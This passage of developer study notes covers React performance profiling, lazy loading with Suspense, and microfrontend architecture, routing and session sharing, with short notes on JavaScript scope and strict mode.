3. Prevents JavaScript from hogging the main thread.
4. Automatic batching

# How to profile a React app and fix bottlenecks.

1. Profiling Tools.

> React DevTools Profiler

```ts
// Wrap components to profile
import { Profiler } from "react";

function App() {
  return (
    <Profiler id="App" onRender={onRenderCallback}>
      <MyComponent />
    </Profiler>
  );
}

function onRenderCallback(id, phase, actualDuration) {
  console.log("Component:", id, "Duration:", actualDuration);
}

//                  Open Browser DevTools :
// Performance Tab: Record and analyze runtime performance
// Memory Tab: Check for memory leaks
// Network Tab: Analyze bundle sizes and loading times
```

2. Common Bottlenecks & Fixes

A. Unnecessary Re-renders

```ts
// Problem: Component re-renders on every parent update
function ExpensiveChild({ data }) {
  return <div>{heavyComputation(data)}</div>;
}

// Fix: Memoize component
const ExpensiveChild = React.memo(({ data }) => {
  return <div>{heavyComputation(data)}</div>;
});
```

B. Expensive Computations

```ts
// Problem: Computation runs on every render
function Component({ items, filter }) {
  const filteredItems = items.filter((item) => item.includes(filter));
  return (
    <div>
      {filteredItems.map((item) => (
        <div key={item}>{item}</div>
      ))}
    </div>
  );
}

// Fix: Use useMemo
function Component({ items, filter }) {
  const filteredItems = useMemo(() => items.filter((item) => item.includes(filter)), [items, filter]);
  return (
    <div>
      {filteredItems.map((item) => (
        <div key={item}>{item}</div>
      ))}
    </div>
  );
}
```

C. Large Lists

```ts
// Problem: Rendering thousands of items
function LargeList({ items }) {
  return (
    <div>
      {items.map((item) => (
        <Item key={item.id} data={item} />
      ))}
    </div>
  );
}

// Fix: Use virtualization
import { FixedSizeList as List } from "react-window";

function LargeList({ items }) {
  return (
    <List height={600} itemCount={items.length} itemSize={50}>
      {({ index, style }) => (
        <div style={style}>
          <Item data={items[index]} />
        </div>
      )}
    </List>
  );
}
```

D. Bundle Size Issues.

```ts
// Problem: Large bundle size
import { debounce } from "lodash";

// Fix: Import only what you need
import debounce from "lodash/debounce";

// Or use dynamic imports
const LazyComponent = React.lazy(() => import("./LazyComponent"));
```

3. Performance Monitoring

A. Web Vitals

```ts
import { getCLS, getFID, getFCP, getLCP, getTTFB } from "web-vitals";

getCLS(console.log);
getFID(console.log);
getFCP(console.log);
getLCP(console.log);
getTTFB(console.log);
```

> NOTE : The key is to profile first, then optimize based on actual bottlenecks rather than premature optimization.

# How does React's Fiber architecture actually work and why does it matter for performance?

> WWhat is React Fiber?
> React Fiber is React's reconciliation engine - the algorithm that decides what changes need to be made to the DOM. Think of it as React's "brain" that figures out how to update your UI efficiently.

> Why Fiber Matters for Performance

1. Responsiveness :
   User interactions stay responsive and Your app never freezes, Even during heavy updates

2. Better User Experience

3. Efficient Updates
   Fiber can batch and prioritize updates

4. Better Performance
   Browser can handle other tasks while React works

5: Smart Priorities
Important things (like user input) happen first and LOW PRIORITY Update notifications later : using startTransition()

### How does lazy works in react

> React.lazy() Architecture & How It Works

1. Code Splitting Mechanism

```ts
const AccountPage = lazy(() => import("./pages/Account").then((m) => ({ default: m.AccountPage })));


`What happens internally:`

> Dynamic Import: import('./pages/Account') creates a separate JavaScript bundle

> Promise Resolution: Returns a Promise that resolves to the module

> Default Export Mapping: .then(m => ({ default: m.AccountPage })) ensures the component is the default export

> Lazy Wrapper: lazy() wraps this in a special React component that handles loading states
```

2. Bundle Splitting Architecture

```ts
Before lazy loading:
main.bundle.js (500KB) - Contains everything

After lazy loading:
main.bundle.js (200KB) - Core app
account.chunk.js (50KB) - Account page (loaded on demand)
profile.chunk.js (40KB) - Profile page (loaded on demand)

```

3. Suspense Component Deep Dive

```ts
<Suspense fallback={<PageLoader />}>
  <AccountPage />
</Suspense>


`Architecture:`

> Boundary Component: Acts as an error boundary for loading states / Suspense is the boundary that catches promises

> Any component can throw promises (not just lazy components) and Suspense catches and  Shows fallback .

> Fallback Rendering: Shows loading UI while chunks download

> Promise Tracking: Monitors lazy component loading promises

> State Management: Handles loading → loaded transitions
```

> Can You Use Lazy Without Suspense?

`Answer : No, Because`

1. Lazy components throw promises during loading
2. Suspense catches these promises and shows fallback
3. Without Suspense, promises bubble up and crash the app

`Key Takeaways`

1. lazy() + Suspense are mandatory partners

2. lazy() handles code splitting and dynamic imports

3. Suspense manages loading states and fallback UI

4. They enable progressive loading for better performance

5. Each lazy component creates a separate bundle chunk

NOTE : Any Component throws promise → Suspense catches → Shows fallback → Re-renders when resolved

### Important :

`The Real Rule`

> lazy() CANNOT be used without Suspense ❌

```ts
// ❌ This will crash your app
const LazyComponent = lazy(() => import("./Component"));

function App() {
  return <LazyComponent />; // Error: Component suspended while rendering
}


`Why it crashes:`

> lazy() components throw promises during loading

> Without Suspense to catch these promises, they bubble up and crash the app
```

> Suspense CAN be used without lazy() ✅

```ts
// ✅ This works perfectly
function DataComponent() {
  const data = someDataResource.read(); // Throws promise while loading
  return <div>{data}</div>;
}

function App() {
  return (
    <Suspense fallback={<div>Loading...</div>}>
      <DataComponent /> {/* No lazy() involved */}
    </Suspense>
  );
}

`Why it works:`

> Suspense catches any promise thrown by any component

> Data fetching, resource loading, or custom async operations can all use Suspense

> lazy() is just one way to throw promises - not the only way
```

. `lazy() → Always throws promises → MUST have Suspense`

. `Suspense → Catches any promises → Can work with or without lazy()`

### What’s the difference between horizontal and vertical sliced microfrontends?

> The difference between horizontal and vertical sliced microfrontends relates to how you divide your application architecture:

1. `Horizontal Slicing (By Technical Layer) / Cut by UI Parts`

> Horizontal slicing splits the application by layers or UI sections rather than full features. Here, each microfrontend handles a part of the UI that may appear across multiple pages, like a search bar or navigation menu. Teams focus on specialized layers, so one team might maintain a UI component used everywhere, while another handles a different reusable part. This approach allows UI components to be reused but involves more coordination between teams and more complexity to maintain a consistent look and shared state.

Divides the application by technical concerns or UI layers:

. Header/Navigation microfrontend
. Sidebar microfrontend
. Footer microfrontend
. Main Content Area microfrontend

```js
┌─────────────────────────────────┐
│        Header MFE               │
├─────────────┬───────────────────┤
│  Sidebar    │   Main Content    │
│    MFE      │      MFE          │
│             │                   │
├─────────────┴───────────────────┤
│        Footer MFE               │
└─────────────────────────────────┘


Pros:

. Shared UI components across domains
. Consistent look and feel
. Easier to maintain design systems

Cons:

. Teams need to coordinate across business domains
. Changes often require multiple team involvement
. Harder to achieve true team autonomy
```

2. `Vertical Slicing (By Business Domain)`

> Vertical slicing means dividing the application by complete features or user journeys. Each vertical slice is a self-contained module that includes everything needed for a feature, including UI and sometimes backend parts. For example, in an e-commerce site, one vertical slice might handle the entire product page while another handles the shopping cart. Each vertical microfrontend runs independently with its own routing and logic, making teams responsible for entire features end-to-end. This approach is simpler technically and keeps each feature cohesive and autonomous.

Divides the application by business capabilities or domains:

. User Management microfrontend
. Product Catalog microfrontend
. Shopping Cart microfrontend
. Payment microfrontend

```js
┌─────────┬─────────┬─────────┬─────────┐
│  User   │Product  │Shopping │Payment  │
│  Mgmt   │Catalog  │  Cart   │   MFE   │
│  MFE    │  MFE    │   MFE   │         │
│         │         │         │         │
│         │         │         │         │
│         │         │         │         │
└─────────┴─────────┴─────────┴─────────┘


Pros:

. True team autonomy per business domain
. Independent deployment and development
. Clear ownership boundaries
. Easier to scale teams

Cons:

. Potential UI inconsistencies
. More complex integration
. Possible code duplication

```

`Which to Choose?`

1. Vertical slicing is generally preferred because:

Aligns with business goals

Enables independent team scaling

Reduces cross-team dependencies

Supports domain-driven design principles

2. Horizontal slicing works better when:

You have strong design system requirements

Teams are organized by technical expertise

UI consistency is critical

```js
Aspect                |  Vertical Slicing                                  |  Horizontal Slicing
----------------------+----------------------------------------------------+------------------------------------------
Splitting basis       |  By full features or pages                         |  By layers or reusable UI components

Ownership             |  Feature-specific, cross-functional teams          |  Specialized teams per UI section

Technical complexity  |  Simpler to manage feature-wise                    |  More complex due to shared components

Deployment            |  Independent feature deployments                   |  Layer/component-specific deployments

Cohesion              |  Features are cohesive and autonomous              |  UI parts reused across multiple features

Example               |  Product page vs shopping cart in e-commerce site  |  Search bar used on multiple pages

```

### How does Module Federation work in your single-page React app?

> Module Federation in a single-page React app works by letting your app dynamically load and share code—like React components or utilities—from other independently built apps at runtime, instead of bundling everything upfront.

`Here's the simplified process:`

1. You set up two or more React apps, with one acting as the "host" (the main app) and others as "remotes" (apps exposing modules).

2. Each remote app uses Webpack's ModuleFederationPlugin to declare which components or modules it exposes.

3. The host app configures ModuleFederationPlugin to know the remote apps' URLs and which exposed modules it wants to use.

4. At runtime, when the host app needs a component from a remote, it loads it over the network dynamically, sharing dependencies like React to avoid duplicates.

5. This allows your React SPA to compose features from multiple independently deployed microfrontends, enabling team autonomy and on-demand loading.

### Who manages the routes if it’s a microfrontend SPA?

> In a microfrontend SPA, routing is managed through different approaches. Let me explain each:

1. `Shell/Container App Manages Routes (Most Common)` : The main app (shell) controls all routing and decides which microfrontend to load:

```js
// Shell App - Main Router
function App() {
  return (
    <Router>
      <Routes>
        <Route path="/users/*" element={<UserMicrofrontend />} />
        <Route path="/products/*" element={<ProductMicrofrontend />} />
        <Route path="/cart/*" element={<CartMicrofrontend />} />
      </Routes>
    </Router>
  );
}


How it works:

User visits /users/profile

Shell app sees /users/* and loads User microfrontend

User microfrontend handles /profile part internally

```

2. `Each Microfrontend Manages Its Own Routes` : Each microfrontend has its own router for internal navigation:

```js
// User Microfrontend
function UserApp() {
  return (
    <Router basename="/users">
      <Routes>
        <Route path="/profile" element={<Profile />} />
        <Route path="/settings" element={<Settings />} />
      </Routes>
    </Router>
  );
}
```

3. `Shared Routing Service`: A central service coordinates routing between microfrontends:

```js
// Shared Router Service
class RouterService {
  navigate(path) {
    // Determines which microfrontend should handle this route
    if (path.startsWith("/users")) {
      loadUserMicrofrontend();
    }
    // Updates browser URL
    window.history.pushState({}, "", path);
  }
}
```

`Key Points:`

1. Shell app = Traffic controller (decides which microfrontend loads)

2. Each microfrontend = Handles its own internal routes

3. Browser URL = Always stays in sync

4. Navigation = Can happen between or within microfrontends

`Most teams use approach #1 because it's simpler and gives clear ownership boundaries.`

### When building a micro-frontend application, is a container or root app necessary, or can I do without it?

> No, a container/root app is NOT compulsory, but it's highly recommended for most cases. Here are your options:

`NOTE`

1. Need shared UI/navigation? → Use container/root app

2. Completely separate apps? → Skip container/root app

`Most teams choose container app because users expect consistent navigation and shared elements across feature`s.

### How is session management handled across multiple microfrontends? explain in simples way ?

> Session management in microfrontends is like having a shared locker that all apps can access. Here are the simple approaches:

1. Shared Browser Storage (Most Common): All microfrontends read/write to the same place:

```js
// User logs in via Auth MFE
localStorage.setItem('userToken', 'abc123');
localStorage.setItem('userId', '456');

// Product MFE reads the same data
const token = localStorage.getItem('userToken');
const userId = localStorage.getItem('userId');

// Cart MFE also reads the same data
if (localStorage.getItem('userToken')) {
  // User is logged in
}


Storage Options:

localStorage - Persists after browser close

sessionStorage - Gone when tab closes

Cookies - Can be shared across subdomains

```

2. Container App Manages Session : The shell app handles login and shares session data:

```js
// User logs in
window.dispatchEvent(
  new CustomEvent("userLogin", {
    detail: { userId: "123", token: "abc" },
  })
);

// Other MFEs listen for changes
window.addEventListener("userLogin", (event) => {
  const { userId, token } = event.detail;
  // Update local state
});

// User logs out
window.dispatchEvent(new CustomEvent("userLogout"));
```

3. Event-Based Communication. Microfrontends notify each other about session changes:

```js
// User logs in
window.dispatchEvent(
  new CustomEvent("userLogin", {
    detail: { userId: "123", token: "abc" },
  })
);

// Other MFEs listen for changes
window.addEventListener("userLogin", (event) => {
  const { userId, token } = event.detail;
  // Update local state
});

// User logs out
window.dispatchEvent(new CustomEvent("userLogout"));
```

4. Shared Session Service : A common library handles all session logic:

```js
// Shared Session Service
class SessionService {
  login(token) {
    localStorage.setItem("token", token);
    this.notifyAll("login", token);
  }

  logout() {
    localStorage.removeItem("token");
    this.notifyAll("logout");
  }

  getUser() {
    return localStorage.getItem("token");
  }
}

// All MFEs use the same service
const session = new SessionService();
```

`Simple Rules:`

1. Same domain = Use localStorage/sessionStorage
2. Need real-time sync = Use events
3. Complex session logic = Use shared service
4. Simple setup = Container app manages it

> NOTE :

If the micro-frontend apps run inside the host app—like the host running on port 3000 and displaying the UI of all micro apps—they can easily access shared data. However, if a micro app runs separately on a different port or domain, it typically cannot access that shared data directly due to browser security restrictions like the same-origin policy."

`Explanation:`
Microfrontends running inside a single host app (same origin, port) can share data using browser storage or in-memory communication.

When microfrontends run on different ports or domains, they face cross-origin restrictions and cannot directly access shared data such as localStorage or in-memory variables.

To communicate across different origins, additional techniques like cross-window messaging (postMessage), shared backend sessions, or APIs are needed.

1. Scenario 1: Microfrontends Running on Different Ports ❌

```js
Host App:     localhost:3000
User MFE:     localhost:3001
Product MFE:  localhost:3002
Cart MFE:     localhost:3003


Problem: They CANNOT share localStorage/sessionStorage because:

1. Browser treats each port as a different origin

2. localhost:3000 and localhost:3001 are separate domains

3. Security policy blocks cross-origin storage access
```

2. Scenario 2: All Running Under Host App ✅

```js
Host App: localhost:3000
├── /users/*    → User MFE (loaded into host)
├── /products/* → Product MFE (loaded into host)
└── /cart/*     → Cart MFE (loaded into host)


Works: All microfrontends share the same origin (localhost:3000), so they can access the same localStorage.
```

> Solutions for Different Ports:

1. Use Cookies with Domain Setting.

```js
// Set cookie that works across subdomains
document.cookie = "userToken=abc123; domain=.localhost";

// All ports can read this cookie
const token = getCookie("userToken");
```

2. PostMessage Communication.

```js
// MFE on port 3001 sends message to host on port 3000
window.parent.postMessage(
  {
    type: "SESSION_UPDATE",
    data: { userId: "123" },
  },
  "http://localhost:3000"
);

// Host receives and broadcasts to other MFEs
window.addEventListener("message", (event) => {
  if (event.data.type === "SESSION_UPDATE") {
    // Notify other MFEs
  }
});
```

3. Shared Backend Session.

```js
// All MFEs call same API for session data
const session = await fetch("http://api.localhost:8000/session");
```

4. Use Same Domain with Reverse Proxy

```js
// Nginx routes different paths to different ports
myapp.com/users     → localhost:3001
myapp.com/products  → localhost:3002
myapp.com/cart      → localhost:3003


```

`Simple Rule:`

1. Same origin (same protocol + domain + port) = Can share storage
2. Different origins = Need special solutions

`Most production microfrontends use Module Federation or iframes to run everything under the same domain, avoiding this issue entirely.`



> Scope

`The context in which variables are declared and accessed`

1. Global Scope:
    Variables declared outside of any function or block;
    Accessible from anywhere in the code.

2. Function Scope:
    Variables declared within a function are accessible only within that function.

3. Block Scope:
    Introduced by {} blocks; variables declared inside a block are limited to that block's scope.
    Let and Const follow block scope.

4. Scope Chain:
    Nested functions search for variables in their own scope, then in the scope of their parent functions, creating a chain.

5. Global Object Access:
    Variables declared without var, let, or const become properties of the global object (e.g., window in browsers).


> Strict Mode
When you enable strict mode in your JavaScript code, the JavaScript interpreter becomes less forgiving and enforces a stricter set of rules. It was introduced in ES5.

1. Variables without var doesn't create a global variable
2. The value of this inside a regular function is undefined contrary to a global context.
3. Disallow eval
4. Do not allow undeclared variables